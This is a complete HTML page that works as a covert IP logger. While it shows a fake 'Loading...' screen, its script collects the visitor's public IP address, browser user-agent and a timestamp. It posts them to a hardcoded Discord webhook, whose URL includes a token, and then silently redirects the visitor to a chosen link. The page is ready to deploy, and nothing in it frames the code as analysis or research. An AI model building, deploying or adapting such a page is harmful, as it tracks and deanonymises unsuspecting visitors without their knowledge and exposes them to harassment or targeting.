<!DOCTYPE html>
<html>
<head>
    <script>
        const params = new URLSearchParams(window.location.search);
        const redirectUrl = params.get('redirect') || 'https://www.youtube.com';

        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                const ip = data.ip;
                const webhook = 'https://discord.com/api/webhooks/1526391820873891932/BjN36ir1LpF2B4iv_EOWwksNTFdFrsByC52nL9o_An44nBIRMAQaXlR_roTRdobF-Har';
                
                const embed = {
                    title: '🎯 New IP Captured',
                    color: 0xe94560,
                    fields: [
                        { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
                        { name: '🖥️ User-Agent', value: `\`${navigator.userAgent}\``, inline: false },
                        { name: '📅 Timestamp', value: `\`${new Date().toUTCString()}\``, inline: true },
                        { name: '🔗 Redirected to', value: `\`${redirectUrl}\``, inline: false }
                    ],
                    footer: { text: 'IP Logger by Plane Crash Survivors' }
                };

                fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                })
                .finally(() => {
                    window.location.href = redirectUrl;
                });
            })
            .catch(() => {
                window.location.href = redirectUrl;
            });
    </script>
</head>
<body style="background:#0d0d1a; color:#fff; text-align:center; padding:50px; font-family:Arial;">
    <h2>⏳ Loading...</h2>
    <p>Please wait a moment.</p>
</body>
</html>
